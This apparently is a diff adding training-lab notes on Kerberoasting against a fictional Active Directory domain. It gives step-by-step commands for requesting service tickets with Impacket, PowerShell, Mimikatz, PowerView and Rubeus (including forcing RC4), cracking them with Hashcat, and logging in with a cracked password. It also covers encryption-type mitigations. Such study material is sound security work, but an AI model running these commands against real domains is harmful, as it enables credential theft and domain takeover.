@@ -1,0 +1,263 @@
+                 
+                 Kerberoasting generally takes two general approaches:
+
+         A standalone implementation of the Kerberos protocol that’s used through a device connected on a network, or via piping the crafted traffic in through a SOCKS proxy. Examples would be Meterpreter or Impacket. This requires credentials for a domain account to perform the roasting, since a TGT needs to be requested for use in the later service ticket requests.
+
+
+        Using built-in Windows functionality on a domain-joined host (like the .NET KerberosRequestorSecurityToken class) to request tickets which are then extracted from the current logon session with Mimikatz or Rubeus. Alternatively, a few years ago @machosec realized the GetRequest() method can be used to carve out the service ticket bytes from KerberosRequestorSecurityToken, meaning we can forgo Mimikatz for ticket extraction. Another advantage of this approach is that the existing user’s TGT is used to request the service tickets, meaning we don’t need plaintext credentials or a user’s hash to perform the Kerberoasting.
+
+
+        With Kerberoasting, we really want RC4 encrypted service ticket replies, as these are orders of magnitude faster to crack than their AES equivalents. If we implement the protocol on the attacker side, we can choose to indicate we only support RC4 during the service ticket request process, resulting in the easier to crack hash format.
+
+
+                 
+                 
+                 
+                 
+                 
+                                    
+                                 
+                 
+                 
+                    Kerberoasting From Linux
+
+
+
+    Service accounts are often configured with weak or reused password to simplify administration, and sometimes the password is the same as the username. If the password for a domain SQL Server service account is cracked, you are likely to find yourself as a local admin on multiple servers, if not Domain Admin. Even if cracking a ticket obtained via a Kerberoasting attack gives a low-privilege user account, we can use it to craft service tickets for the service specified in the SPN. For example, if the SPN is set to MSSQL/SRV01, we can access the MSSQL service as sysadmin, enable the xp_cmdshell extended procedure and gain code execution on the target SQL server.
+
+
+Depending on your position in a network, this attack can be performed in multiple ways:
+
+        From a non-domain joined Linux host using valid domain user credentials.
+        From a domain-joined Linux host as root after retrieving the keytab file.
+        From a domain-joined Windows host authenticated as a domain user.
+        From a domain-joined Windows host with a shell in the context of a domain account.
+        As SYSTEM on a domain-joined Windows host.
+        From a non-domain joined Windows host using runas /netonly.
+
+Several tools can be utilized to perform the attack:
+
+        Impacket’s GetUserSPNs.py from a non-domain joined Linux host.
+        A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
+        From Windows, utilizing tools such as PowerView, Rubeus, and other PowerShell scripts.
+
+
+    
+    Obtaining a TGS ticket via Kerberoasting does not guarantee you a set of valid credentials, and the ticket must still be cracked offline with a tool such as Hashcat to obtain the cleartext password. TGS tickets take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using a standard cracking rig.
+
+
+            
+            \\\Kerberoasting with GetUserSPNs.py
+
+    !!!A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it. 
+
+
+    \\Installing Impacket using Pip
+
+    $ sudo python3 -m pip install .
+
+
+    \\Listing SPN Accounts with GetUserSPNs.py
+
+    We can start by just gathering a listing of SPNs in the domain. To do this, we will need a set of valid domain credentials and the IP address of a Domain Controller. We can authenticate to the Domain Controller with a cleartext password, NT password hash, or even a Kerberos ticket. For our purposes, we will use a password. Entering the below command will generate a credential prompt and then a nicely formatted listing of all SPN accounts. From the output below, we can see that several accounts are members of the Domain Admins group. If we can retrieve and crack one of these tickets, it could lead to domain compromise. It is always worth investigating the group membership of all accounts because we may find an account with an easy-to-crack ticket that can help us further our goal of moving laterally/vertically in the target domain.
+
+
+
+    $ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/{user}
+
+    
+    
+    \\Requesting all TGS Tickets
+
+    We can now pull all TGS tickets for offline processing using the -request flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or John the Ripper for offline password cracking attempts.
+
+    $ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/{user} -request 
+
+
+
+
+    \\Requesting a Single TGS ticket
+
+    We can also be more targeted and request just the TGS ticket for a specific account. Let's try requesting one for just the sqldev account.
+
+    $ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
+
+
+    . Now we can attempt to crack the ticket offline using Hashcat hash mode 13100.
+
+
+    \\Cracking the Ticket Offline with Hashcat
+
+    $ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
+
+
+
+    \\Testing Authentication against a Domain Controller
+
+    As the last step, we can confirm our access and see that we indeed have Domain Admin rights as we can authenticate to the target DC in the INLANEFREIGHT.LOCAL domain. From here, we could perform post-exploitation and continue to enumerate the domain for other paths to compromise and other notable flaws and misconfigurations.
+
+
+    $ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
+
+
+
+
+
+
+
+
+                                Kreberoasting on Windows
+
+
+
+
+
+                \\\Kerberoasting - Semi Manual method
+
+        
+        
+        \\Enumerating SPNs with setspn.exe
+
+        C:\htb> setspn.exe -Q */*
+
+
+        \\Targeting a Single User
+
+        Next, using PowerShell, we can request TGS tickets for an account in the shell above and load them into memory. Once they are loaded into memory, we can extract them using Mimikatz. Let's try this by targeting a single user:
+
+        PS C:\htb> Add-Type -AssemblyName System.IdentityModel
+        
+        PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+
+
+        Before moving on, let's break down the commands above to see what we are doing (which is essentially what is used by Rubeus when using the default Kerberoasting method):
+
+        The Add-Type cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
+        The -AssemblyName parameter allows us to specify an assembly that contains types that we are interested in using
+        System.IdentityModel is a namespace that contains different classes for building security token services
+        We'll then use the New-Object cmdlet to create an instance of a .NET Framework object
+        We'll use the System.IdentityModel.Tokens namespace with the KerberosRequestorSecurityToken class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session
+
+
+
+        \\\Retrieving All Tickets Using setspn.exe
+
+        PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+
+    
+        
+        \\\Extracting Tickets from Memory with Mimikatz
+
+        mimikatz # base64 /out:true
+
+        mimikatz # kerberos::list /export  
+
+
+        If we do not specify the base64 /out:true command, Mimikatz will extract the tickets and write them to .kirbi files. Depending on our position on the network and if we can easily move files to our attack host, this can be easier when we go to crack the tickets. Let's take the base64 blob retrieved above and prepare it for cracking.
+
+
+        \\Preparing the Base64 Blob for Cracking
+
+        $ echo "<base64 blob>" |  tr -d \\n 
+
+        We can place the above single line of output into a file and convert it back to a .kirbi file using the base64 utility.
+
+        $ cat encoded_file | base64 -d > sqldev.kirbi
+
+        \\Extracting the Kerberos Ticket using kirbi2john.py
+
+        $ python2.7 kirbi2john.py sqldev.kirbi
+
+        This will create a file called crack_file. We then must modify the file a bit to be able to use Hashcat against the hash.
+
+        $ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
+
+        \\\Cracking the Hash with Hashcat
+
+        $ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
+
+        If we decide to skip the base64 output with Mimikatz and type mimikatz # kerberos::list /export, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run kirbi2john.py against them directly, skipping the base64 decoding step.
+
+
+
+                \\\\Automated --Tool Based Route
+
+
+        \\Using PowerView to Extract TGS Tickets
+
+        PS C:\htb> Import-Module .\PowerView.ps1
+       
+        PS C:\htb> Get-DomainUser * -spn | select samaccountname
+
+
+        \\Using PowerView to Target a Specific User
+
+        From here, we could target a specific user and retrieve the TGS ticket in Hashcat format.
+
+        PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+
+        \\Exporting All Tickets to a CSV File
+
+        PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+
+        \\Viewing the Contents of the .CSV File
+
+        PS C:\htb> cat .\ilfreight_tgs.csv
+
+
+        \\Using Rubeus
+
+
+        We can also use Rubeus from GhostPack to perform Kerberoasting even faster and easier. Rubeus provides us with a variety of options for performing Kerberoasting.
+
+        \\Using the /stats Flag
+
+
+        PS C:\htb> .\Rubeus.exe kerberoast /stats
+
+
+        \\Using the /nowrap Flag
+
+        Let's use Rubeus to request tickets for accounts with the admincount attribute set to 1. These would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat. Be sure to specify the /nowrap flag so that the hash can be more easily copied down for offline cracking using Hashcat. Per the documentation, the ""/nowrap" flag prevents any base64 ticket blobs from being column wrapped for any function"; therefore, we won't have to worry about trimming white space or newlines before cracking with Hashcat.
+
+        PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+
+
+
+        \\A Note on Encryption Types
+
+        Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. When performing Kerberoasting in most environments, we will retrieve hashes that begin with $krb5tgs$23$*, an RC4 (type 23) encrypted ticket. Sometimes we will receive an AES-256 (type 18) encrypted hash or hash that begins with $krb5tgs$18$*. While it is possible to crack AES-128 (type 17) and AES-256 (type 18) TGS tickets using Hashcat, it will typically be significantly more time consuming than cracking an RC4 (type 23) encrypted ticket, but still possible especially if a weak password is chosen. Let's walk through an example.
+
+
+
+        \\Checking Supported Encryption Types
+
+
+        PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+
+
+
+        requesting a ticket and showing the above hash means AES256 is supported
+
+        $krb5tgs$18${user}.......
+
+        $ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
+
+
+
+        \\Using the /tgtdeleg Flag
+
+        We can use Rubeus with the /tgtdeleg flag to specify that we want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request. This may be a failsafe built-in to Active Directory for backward compatibility. By using this flag, we can request an RC4 (type 23) encrypted ticket that can be cracked much faster.
+
+
+           PS C:\htb> .\Rubeus.exe kerberoast /tgtdeleg /user:testspn
+
+
+           !!!!Note: This does not work against a Windows Server 2019 Domain Controller, regardless of the domain functional level. It will always return a service ticket encrypted with the highest level of encryption supported by the target account. This being said, if we find ourselves in a domain with Domain Controllers running on Server 2016 or earlier (which is quite common), enabling AES will not partially mitigate Kerberoasting by only returning AES encrypted tickets, which are much more difficult to crack, but rather will allow an attacker to request an RC4 encrypted service ticket. In Windows Server 2019 DCs, enabling AES encryption on an SPN account will result in us receiving an AES-256 (type 18) service ticket, which is substantially more difficult (but not impossible) to crack, especially if a relatively weak dictionary password is in use
+
+
+           It is possible to edit the encryption types used by Kerberos. This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options, then double-clicking on Network security: Configure encryption types allowed for Kerberos and selecting the desired encryption type allowed for Kerberos. Removing all other encryption types except for RC4_HMAC_MD5 would allow for the above downgrade example to occur in 2019. Removing support for AES would introduce a security flaw into AD and should likely never be done. Furthermore, removing support for RC4 regardless of the Domain Controller Windows Server version or domain functional level could have operational impacts and should be thoroughly tested before implementation.
+
+
+
+           
